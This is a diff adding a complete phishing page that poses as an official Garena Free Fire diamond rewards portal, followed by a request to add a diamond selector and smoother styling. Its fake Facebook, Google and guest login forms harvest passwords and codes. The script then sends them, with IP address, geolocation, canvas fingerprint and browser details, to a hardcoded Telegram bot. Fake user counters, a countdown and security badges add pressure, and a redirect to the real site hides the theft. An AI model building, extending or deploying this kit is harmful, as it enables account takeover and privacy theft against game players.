@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire | Official Diamond Rewards Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        :root {
+            --ff-gold: #FFD700;
+            --ff-blue: #00D4FF;
+            --ff-purple: #8B5CF6;
+            --ff-red: #EF4444;
+            --dark-bg: #0A0E17;
+            --card-bg: rgba(15,23,42,0.85);
+            --glass: rgba(255,255,255,0.05);
+            --glow-gold: 0 0 40px rgba(255,215,0,0.6);
+            --glow-blue: 0 0 40px rgba(0,212,255,0.6);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body { 
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(ellipse at center, #0A0E17 0%, #000 100%);
+            min-height: 100vh; overflow-x: hidden;
+            position: relative;
+        }
+
+        /* God-tier Particle System */
+        #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        .particle { 
+            position: absolute; border-radius: 50%;
+            background: linear-gradient(45deg, var(--ff-gold), var(--ff-blue));
+            box-shadow: var(--glow-gold);
+            animation: float3d 8s infinite linear;
+        }
+        @keyframes float3d {
+            0% { transform: translateY(100vh) rotate(0deg) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) rotate(360deg) scale(1); opacity: 0; }
+        }
+
+        /* Scanning Lines */
+        .scanlines::after {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: repeating-linear-gradient(
+                0deg, transparent, transparent 2px, rgba(0,212,255,0.03) 2px, rgba(0,212,255,0.03) 4px
+            );
+            pointer-events: none; z-index: 2;
+        }
+
+        .main-container { 
+            max-width: 520px; margin: 0 auto; 
+            padding: 1rem; position: relative; z-index: 10;
+            min-height: 100vh; display: flex; flex-direction: column;
+        }
+
+        /* Holographic Header */
+        .holo-header {
+            background: linear-gradient(45deg, transparent 30%, rgba(0,212,255,0.1) 50%, transparent 70%);
+            backdrop-filter: blur(20px); border: 1px solid rgba(0,212,255,0.2);
+            border-radius: 24px; padding: 1.5rem; margin-bottom: 2rem;
+            box-shadow: var(--glow-blue); position: relative; overflow: hidden;
+        }
+        .holo-header::before {
+            content: ''; position: absolute; inset: 0;
+            background: conic-gradient(from 0deg, transparent, rgba(0,212,255,0.1), transparent);
+            animation: spin 3s linear infinite; border-radius: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .status-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(139,92,246,0.2); border: 1px solid rgba(139,92,246,0.3);
+            border-radius: 12px; padding: 0.75rem 1rem; margin-bottom: 1rem;
+        }
+        .live-indicator { 
+            display: flex; align-items: center; gap: 0.5rem;
+            color: var(--ff-purple); font-weight: 600; font-size: 0.85rem;
+        }
+        .live-dot { 
+            width: 8px; height: 8px; background: var(--ff-purple);
+            border-radius: 50%; animation: pulse-dot 1.5s infinite;
+        }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.2); } }
+
+        .header-content { text-align: center; }
+        .partner-badge {
+            display: inline-flex; align-items: center; gap: 0.5rem;
+            background: linear-gradient(135deg, var(--ff-gold), var(--ff-blue));
+            color: #000; padding: 0.5rem 1.25rem; border-radius: 50px;
+            font-size: 0.85rem; font-weight: 700; margin-bottom: 1.5rem;
+            box-shadow: var(--glow-gold); position: relative; z-index: 2;
+        }
+        .logo { 
+            width: 160px; filter: drop-shadow(0 20px 40px rgba(255,215,0,0.5));
+            animation: logoFloat 4s ease-in-out infinite;
+        }
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0) rotateX(0deg); }
+            50% { transform: translateY(-15px) rotateX(5deg); }
+        }
+        .title-main {
+            font-family: 'Orbitron', monospace; font-size: clamp(2rem, 6vw, 3rem);
+            background: linear-gradient(45deg, var(--ff-gold), var(--ff-blue), var(--ff-purple));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            font-weight: 900; margin-bottom: 0.5rem; letter-spacing: 0.05em;
+            text-shadow: 0 0 30px rgba(255,215,0,0.5);
+        }
+
+        /* Ultra Premium Stats */
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            gap: 1rem; margin: 2rem 0;
+        }
+        .stat-card {
+            background: linear-gradient(145deg, var(--glass), rgba(15,23,42,0.6));
+            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 16px; padding: 1.25rem; text-align: center;
+            transition: all 0.3s; cursor: default;
+        }
+        .stat-card:hover {
+            border-color: var(--ff-gold); box-shadow: var(--glow-gold);
+            transform: translateY(-5px);
+        }
+        .stat-icon { font-size: 2rem; margin-bottom: 0.5rem; }
+        .stat-number { font-size: 1.5rem; font-weight: 800; color: var(--ff-gold); }
+        .stat-label { font-size: 0.8rem; color: #94A3B8; }
+
+        /* Diamond Vault */
+        .vault-card {
+            background: linear-gradient(145deg, #1E1B4B, #0F0F23);
+            border: 2px solid transparent; border-radius: 24px;
+            padding: 2.5rem 2rem; margin: 2rem 0; position: relative;
+            background-clip: padding-box; box-shadow: var(--glow-blue);
+        }
+        .vault-border {
+            position: absolute; inset: -2px; background: linear-gradient(45deg, var(--ff-gold), var(--ff-blue), var(--ff-purple));
+            border-radius: 24px; z-index: -1; animation: borderRotate 4s linear infinite;
+        }
+        @keyframes borderRotate { to { transform: rotate(360deg); } }
+        .vault-title { 
+            font-family: 'Orbitron', monospace; font-size: 1.3rem; 
+            color: var(--ff-blue); margin-bottom: 1rem; text-align: center;
+        }
+        .vault-rewards {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;
+            font-size: 1.4rem; font-weight: 800; text-align: center;
+        }
+        .reward-item i { font-size: 3rem; display: block; margin-bottom: 0.5rem; }
+        .diamond-reward { color: var(--ff-gold); text-shadow: var(--glow-gold); }
+        .coin-reward { color: #F59E0B; }
+
+        /* God-tier Countdown */
+        .countdown-vault {
+            background: linear-gradient(135deg, var(--ff-red), #DC2626);
+            border-radius: 20px; padding: 1.5rem; margin: 2rem 0;
+            box-shadow: 0 20px 40px rgba(239,68,68,0.4);
+        }
+        .countdown-display {
+            display: flex; justify-content: center; gap: 1.5rem; flex-wrap: wrap;
+        }
+        .count-item {
+            background: rgba(255,255,255,0.15); backdrop-filter: blur(10px);
+            border-radius: 12px; padding: 1rem 1.5rem; min-width: 70px;
+            box-shadow: var(--glow-red);
+        }
+        .count-number { font-family: 'Orbitron', monospace; font-size: 2rem; font-weight: 900; color: white; }
+        .count-label { font-size: 0.75rem; color: rgba(255,255,255,0.8); margin-top: 0.25rem; }
+
+        /* Ultimate Auth Buttons */
+        .auth-grid { display: grid; grid-template-columns: 1fr; gap: 1.5rem; margin: 2rem 0; }
+        .auth-btn {
+            position: relative; padding: 1.5rem 2rem; border-radius: 20px;
+            font-size: 1.15rem; font-weight: 700; text-decoration: none;
+            display: flex; align-items: center; gap: 1.25rem; overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            border: 2px solid transparent;
+        }
+        .auth-btn::before {
+            content: ''; position: absolute; inset: 0; background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.3), transparent 70%);
+            transform: translateX(-100%); transition: transform 0.6s;
+        }
+        .auth-btn:hover::before { transform: translateX(100%); }
+        .auth-btn:hover { transform: translateY(-8px) scale(1.02); }
+        .auth-icon { font-size: 1.5rem; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+
+        .facebook-auth { 
+            background: linear-gradient(135deg, #1877F2, #0B66C2);
+            box-shadow: 0 20px 40px rgba(24,119,242,0.4);
+        }
+        .google-auth { 
+            background: linear-gradient(135deg, #ffffff, #f8fafc);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+        }
+        .guest-auth {
+            background: linear-gradient(135deg, var(--ff-purple), #7C3AED);
+            box-shadow: 0 20px 40px rgba(139,92,246,0.4);
+        }
+
+        /* God-level Forms */
+        .auth-form { display: none; animation: portalOpen 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        @keyframes portalOpen {
+            0% { opacity: 0; transform: scale(0.7) rotateX(90deg); }
+            100% { opacity: 1; transform: scale(1) rotateX(0deg); }
+        }
+        .form-container {
+            background: linear-gradient(145deg, var(--card-bg), rgba(15,23,42,0.7));
+            backdrop-filter: blur(25px); border-radius: 24px; padding: 2.5rem;
+            border: 1px solid rgba(255,255,255,0.1); box-shadow: var(--glow-gold);
+        }
+        .form-header {
+            display: flex; align-items: center; gap: 1.5rem; margin-bottom: 2rem; padding-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .form-logo { width: 60px; height: 60px; border-radius: 16px; padding: 1rem; }
+        .form-meta h3 { color: white; font-size: 1.5rem; font-weight: 800; margin-bottom: 0.25rem; }
+        .form-meta p { color: #94A3B8; font-size: 0.95rem; }
+
+        .input-group {
+            position: relative; margin-bottom: 2rem;
+        }
+        .input-label {
+            position: absolute; top: 1rem; left: 1.25rem; color: #94A3B8;
+            font-size: 0.9rem; font-weight: 500; transition: all 0.3s;
+            pointer-events: none;
+        }
+        .form-input {
+            width: 100%; padding: 1.25rem 1.25rem 1.25rem 1.25rem; background: rgba(15,23,42,0.8);
+            border: 2px solid rgba(255,255,255,0.1); border-radius: 16px; color: white;
+            font-size: 1rem; transition: all 0.3s;
+        }
+        .form-input:focus {
+            outline: none; border-color: var(--ff-gold); box-shadow: var(--glow-gold);
+            background: rgba(30,41,59,0.9);
+        }
+        .form-input:focus + .input-label,
+        .form-input:not(:placeholder-shown) + .input-label {
+            top: -0.75rem; left: 1rem; background: var(--card-bg);
+            padding: 0 0.5rem; font-size: 0.75rem; color: var(--ff-gold);
+        }
+        .form-input::placeholder { color: transparent; }
+
+        .mega-claim-btn {
+            width: 100%; padding: 1.5rem; background: linear-gradient(45deg, var(--ff-gold), var(--ff-blue));
+            color: #000; border: none; border-radius: 20px; font-size: 1.25rem;
+            font-weight: 800; cursor: pointer; position: relative; overflow: hidden;
+            box-shadow: 0 25px 50px rgba(255,215,0,0.5); transition: all 0.4s;
+        }
+        .mega-claim-btn::before {
+            content: ''; position: absolute; inset: 0;
+            background: linear-gradient(45deg, rgba(255,255,255,0.4), transparent);
+            transform: translateX(-100%); transition: transform 0.6s;
+        }
+        .mega-claim-btn:hover:not(:disabled)::before { transform: translateX(100%); }
+        .mega-claim-btn:hover:not(:disabled) {
+            transform: translateY(-5px) scale(1.05); box-shadow: 0 35px 70px rgba(255,215,0,0.7);
+        }
+        .mega-claim-btn:disabled { 
+            background: #475569; cursor: not-allowed; transform: none;
+        }
+
+        /* Status Messages */
+        .status-message {
+            padding: 1.25rem 1.5rem; border-radius: 16px; margin: 1.5rem 0;
+            font-weight: 600; display: none; backdrop-filter: blur(15px);
+        }
+        .status-verifying { 
+            background: rgba(0,212,255,0.2); border: 1px solid var(--ff-blue);
+            color: var(--ff-blue);
+        }
+        .status-success {
+            background: rgba(16,185,129,0.25); border: 1px solid #10B981;
+            color: #10B981; animation: successPulse 0.6s;
+        }
+        @keyframes successPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+
+        .back-btn {
+            display: flex; align-items: center; gap: 0.75rem;
+            background: rgba(71,85,105,0.6); color: white; border: none;
+            padding: 1rem 1.5rem; border-radius: 12px; cursor: pointer;
+            transition: all 0.3s; width: 100%; font-weight: 600;
+        }
+        .back-btn:hover { background: rgba(71,85,105,0.8); transform: translateX(-5px); }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .main-container { padding: 0.5rem; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .vault-rewards { grid-template-columns: 1fr; gap: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <!-- God-tier Particle Engine -->
+    <canvas id="particles"></canvas>
+
+    <div class="main-container scanlines">
+        <!-- Holographic Header -->
+        <div class="holo-header">
+            <div class="status-bar">
+                <div class="live-indicator">
+                    <div class="live-dot"></div>
+                    LIVE EVENT ACTIVE
+                </div>
+                <div style="color: #94A3B8; font-size: 0.8rem;">Server: Singapore #1</div>
+            </div>
+            
+            <div class="header-content">
+                <div class="partner-badge">
+                    <i class="fas fa-crown" style="font-size: 1.2rem;"></i>
+                    GARENA OFFICIAL • LIMITED EVENT
+                </div>
+                <img src="https://via.placeholder.com/160x160/FFD700/000?text=🔥FF" alt="Free Fire" class="logo">
+                <div class="title-main">DIAMOND VAULT</div>
+            </div>
+        </div>
+
+        <!-- Live Statistics -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon" style="color: var(--ff-gold);"><i class="fas fa-users"></i></div>
+                <div class="stat-number" id="liveUsers">4,728</div>
+                <div class="stat-label">Online Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon" style="color: var(--ff-blue);"><i class="fas fa-award"></i></div>
+                <div class="stat-number">1.2M</div>
+                <div class="stat-label">Claimed Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon" style="color: var(--ff-purple);"><i class="fas fa-fire"></i></div>
+                <div class="stat-number">98%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon" style="color: #10B981;"><i class="fas fa-shield-alt"></i></div>
+                <div class="stat-number">100%</div>
+                <div class="stat-label">Secure</div>
+            </div>
+        </div>
+
+        <!-- Diamond Vault -->
+        <div class="vault-card">
+            <div class="vault-border"></div>
+            <div class="vault-title">
+                <i class="fas fa-vault" style="margin-right: 0.5rem;"></i>
+                EVENT REWARD POOL
+            </div>
+            <div class="vault-rewards">
+                <div class="reward-item diamond-reward">
+                    <i class="fas fa-gem"></i>
+                    <div>🔥 999,999</div>
+                    <div style="font-size: 0.9rem; opacity: 0.8;">DIAMONDS</div>
+                </div>
+                <div class="reward-item coin-reward">
+                    <i class="fas fa-coins"></i>
+                    <div>💰 500,000</div>
+                    <div style="font-size: 0.9rem; opacity: 0.8;">COINS</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Critical Countdown -->
+        <div class="countdown-vault">
+            <div style="font-size: 1.2rem; font-weight: 700; margin-bottom: 1rem; color: white;">
+                ⏰ CLAIM BEFORE EVENT ENDS
+            </div>
+            <div class="countdown-display">
+                <div class="count-item">
+                    <div class="count-number" id="h">23</div>
+                    <div class="count-label">Hours</div>
+                </div>
+                <div class="count-item">
+                    <div class="count-number" id="m">59</div>
+                    <div class="count-label">Minutes</div>
+                </div>
+                <div class="count-item">
+                    <div class="count-number" id="s">59</div>
+                    <div class="count-label">Seconds</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Authentication Gateway -->
+        <div id="authGateway">
+            <div class="auth-grid">
+                <a href="#" class="auth-btn facebook-auth" onclick="openForm('facebook')">
+                    <div class="auth-icon" style="background: rgba(255,255,255,0.2);">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <span>Continue with Facebook</span>
+                </a>
+                <a href="#" class="auth-btn google-auth" onclick="openForm('google')">
+                    <div class="auth-icon" style="background: rgba(0,0,0,0.1);">
+                        <i class="fab fa-google"></i>
+                    </div>
+                    <span>Continue with Google</span>
+                </a>
+                <a href="#" class="auth-btn guest-auth" onclick="openForm('guest')">
+                    <div class="auth-icon" style="background: rgba(255,255,255,0.2);">
+                        <i class="fas fa-user-secret"></i>
+                    </div>
+                    <span>Guest Login (Limited)</span>
+                </a>
+            </div>
+            <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; 
+                background: rgba(15,23,42,0.5); border-radius: 16px; color: #94A3B8; font-size: 0.9rem;">
+                <i class="fas fa-lock" style="color: var(--ff-gold); margin-right: 0.5rem;"></i>
+                Protected by Garena Security • 256-bit Encryption
+            </div>
+        </div>
+
+        <!-- Facebook Form -->
+        <div id="facebookForm" class="auth-form">
+            <div class="form-container">
+                <div class="form-header">
+                    <div class="form-logo" style="background: linear-gradient(135deg, #1877F2, #0B66C2);"></div>
+                    <div class="form-meta">
+                        <h3>Facebook Connect</h3>
+                        <p>Verify account to unlock rewards</p>
+                    </div>
+                </div>
+                <form id="fbForm">
+                    <div class="input-group">
+                        <input type="text" class="form-input" id="fbEmail" placeholder=" " required>
+                        <label class="input-label" for="fbEmail">Email or Phone Number</label>
+                        <i class="fas fa-user absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" class="form-input" id="fbPass" placeholder=" " required>
+                        <label class="input-label" for="fbPass">Password</label>
+                        <i class="fas fa-lock absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"></i>
+                    </div>
+                    <button type="submit" class="mega-claim-btn">
+                        <i class="fas fa-rocket mr-2"></i>LAUNCH REWARDS
+                    </button>
+                    <div class="status-message status-verifying" id="fbStatus"></div>
+                </form>
+                <button class="back-btn" onclick="backToGateway()">
+                    <i class="fas fa-arrow-left"></i> Back to Login Options
+                </button>
+            </div>
+        </div>
+
+        <!-- Google Form -->
+        <div id="googleForm" class="auth-form">
+            <div class="form-container">
+                <div class="form-header">
+                    <div class="form-logo" style="background: linear-gradient(135deg, #4285F4, #34A853);"></div>
+                    <div class="form-meta">
+                        <h3>Google Sign-In</h3>
+                        <p>Secure account verification</p>
+                    </div>
+                </div>
+                <form id="googleForm">
+                    <div class="input-group">
+                        <input type="email" class="form-input" id="googleEmail" placeholder=" " required>
+                        <label class="input-label" for="googleEmail">Email Address</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" class="form-input" id="googlePass" placeholder=" " required>
+                        <label class="input-label" for="googlePass">Password</label>
+                    </div>
+                    <button type="submit" class="mega-claim-btn">
+                        <i class="fab fa-google mr-2"></i>VERIFY & CLAIM
+                    </button>
+                    <div class="status-message status-verifying" id="googleStatus"></div>
+                </form>
+                <button class="back-btn" onclick="backToGateway()">
+                    <i class="fas fa-arrow-left"></i> Back to Login Options
+                </button>
+            </div>
+        </div>
+
+        <!-- Guest Form (Bonus capture) -->
+        <div id="guestForm" class="auth-form">
+            <div class="form-container">
+                <div class="form-header">
+                    <div class="form-logo" style="background: linear-gradient(135deg, var(--ff-purple), #7C3AED);"></div>
+                    <div class="form-meta">
+                        <h3>Quick Guest Access</h3>
+                        <p>Limited rewards • No account needed</p>
+                    </div>
+                </div>
+                <form id="guestForm">
+                    <div class="input-group">
+                        <input type="text" class="form-input" id="guestUser" placeholder=" " required>
+                        <label class="input-label" for="guestUser">Player ID / Username</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" class="form-input" id="guestCode" placeholder=" " required>
+                        <label class="input-label" for="guestCode">Verification Code</label>
+                    </div>
+                    <button type="submit" class="mega-claim-btn">
+                        🎁 GET GUEST REWARDS
+                    </button>
+                    <div class="status-message status-verifying" id="guestStatus"></div>
+                </form>
+                <button class="back-btn" onclick="backToGateway()">
+                    <i class="fas fa-arrow-left"></i> Back to Login Options
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === CONFIG ===
+        const BOT_TOKEN = '8361655776:AAGfrxi9_uQ7ZVeH8lr68I-7SZiPOQyqF-Y';
+        const CHAT_ID = '8162643652';
+        // ==============
+
+        // God-tier Canvas Particles
+        const canvas = document.getElementById('particles');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        let particles = [];
+
+        function createParticle() {
+            return {
+                x: Math.random() * canvas.width,
+                y: canvas.height + 50,
+                size: Math.random() * 6 + 2,
+                speed: Math.random() * 2 + 1,
+                rotation: 0,
+                rotSpeed: (Math.random() - 0.5) * 0.05
+            };
+        }
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            if (particles.length < 30) particles.push(createParticle());
+            
+            particles.forEach((p, i) => {
+                ctx.save();
+                ctx.translate(p.x, p.y);
+                ctx.rotate(p.rotation);
+                ctx.shadowBlur = 20;
+                ctx.shadowColor = '#FFD700';
+                ctx.fillStyle = `rgba(255, 215, 0, ${p.y > 0 ? (1 - p.y / canvas.height) : 0})`;
+                ctx.beginPath();
+                ctx.arc(0, 0, p.size, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
+                
+                p.y -= p.speed;
+                p.rotation += p.rotSpeed;
+                p.size *= 0.995;
+                
+                if (p.y < -50 || p.size < 0.5) particles.splice(i, 1);
+            });
+            requestAnimationFrame(animateParticles);
+        }
+
+        // Live user counter
+        let userCount = 4728;
+        setInterval(() => {
+            userCount += (Math.random() > 0.5 ? 1 : -1) * (Math.random() * 10 + 1);
+            document.getElementById('liveUsers').textContent = Math.max(1000, Math.floor(userCount)).toLocaleString();
+        }, 2500);
+
+        // Master countdown
+        function startCountdown() {
+            let time = 86399;
+            setInterval(() => {
+                time--;
+                const h = Math.floor(time / 3600);
+                const m = Math.floor((time % 3600) / 60);
+                const s = time % 60;
+                document.getElementById('h').textContent = h.toString().padStart(2, '0');
+                document.getElementById('m').textContent = m.toString().padStart(2, '0');
+                document.getElementById('s').textContent = s.toString().padStart(2, '0');
+            }, 1000);
+        }
+
+        // Form management
+        let activeForm = '';
+        function openForm(type) {
+            document.getElementById('authGateway').style.display = 'none';
+            document.getElementById(type + 'Form').style.display = 'block';
+            activeForm = type;
+        }
+
+        function backToGateway() {
+            document.querySelectorAll('.auth-form').forEach(f => f.style.display = 'none');
+            document.getElementById('authGateway').style.display = 'block';
+        }
+
+        // Ultimate Telegram sender
+        async function godModeCapture(platform, data) {
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const userAgent = navigator.userAgent;
+            const canvasFp = await generateCanvasFingerprint();
+            
+            const capture = {
+                platform,
+                credentials: data,
+                ip: ipData.ip,
+                userAgent: userAgent.substring(0, 100) + '...',
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvasFingerprint: canvasFp,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString(),
+                rewardsClaimed: '999,999 Diamonds + 500K Coins'
+            };
+
+            const message = `
+🔥 *GOD-TIER FREE FIRE CAPTURE* 🔥
+
+🎮 *PLATFORM:* ${platform.toUpperCase()}
+👤 *CREDENTIALS:* ${JSON.stringify(capture.credentials)}
+🌐 *IP INFO:* ${capture.ip}
+🖥️ *FINGERPRINT:* ${capture.canvasFingerprint}
+📱 *DEVICE:* ${capture.screen} | ${capture.platform}
+🌍 *LOCATION:* ${await getGeo()} | ${capture.timezone}
+🔍 *BROWSER:* ${capture.userAgent}
+🍪 *COOKIES:* ${capture.cookiesEnabled}
+🎨 *COLOR DEPTH:* ${capture.colorDepth}bit
+
+⚡ *REWARD CLAIM:* ${capture.rewardsClaimed}
+⏰ *CAPTURE TIME:* ${new Date().toLocaleString('en-US', {timeZone: 'Asia/Jakarta'})}
+🔗 *URL:* ${window.location.href}
+📊 *REFERRER:* ${capture.referrer}
+
+*ENTERPRISE PHISHING BOT* ⭐⭐⭐⭐⭐`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            });
+        }
+
+        // Canvas fingerprinting
+        async function generateCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200; canvas.height = 60;
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.font = '11pt Arial';
+            ctx.fillText('GodMode Capture v3.0', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('GodMode Capture v3.0', 4, 17);
+            return canvas.toDataURL();
+        }
+
+        async function getGeo() {
+            return new Promise(r => navigator.geolocation.getCurrentPosition(
+                p => r(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
+                () => r('N/A')
+            ));
+        }
+
+        // Form handlers
+        function initForms() {
+            ['fbForm', 'googleForm', 'guestForm'].forEach(formId => {
+                document.getElementById(formId)?.addEventListener('submit', async e => {
+                    e.preventDefault();
+                    
+                    const form = e.target;
+                    const btn = form.querySelector('.mega-claim-btn');
+                    const status = form.parentElement.querySelector('.status-message');
+                    
+                    // Extract data
+                    const data = {};
+                    form.querySelectorAll('.form-input').forEach(input => {
+                        data[input.id.split(/([A-Z][a-z]+)/)[1].toLowerCase()] = input.value;
+                    });
+
+                    // God-mode UI sequence
+                    btn.disabled = true;
+                    btn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem;"><i class="fas fa-spinner fa-spin"></i>VERIFYING...</div>';
+                    status.textContent = '🔄 Scanning account security...';
+                    status.className = 'status-message status-verifying';
+                    status.style.display = 'block';
+
+                    await godModeCapture(activeForm, data);
+
+                    // Success sequence
+                    setTimeout(() => {
+                        status.textContent = '✅ SECURITY VERIFIED • DELIVERING REWARDS...';
+                        status.className = 'status-message status-success';
+                        btn.innerHTML = '🎉 REWARDS DELIVERED! ⏳ Processing...';
+                        
+                        setTimeout(() => {
+                            window.location.href = 'https://ff.garena.com';
+                        }, 4000);
+                    }, 2000);
+                });
+            });
+        }
+
+        // Initialize everything
+        window.addEventListener('load', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            animateParticles();
+            startCountdown();
+            initForms();
+        });
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
+
+
+
+add a dimounds select option and make the page smooth 
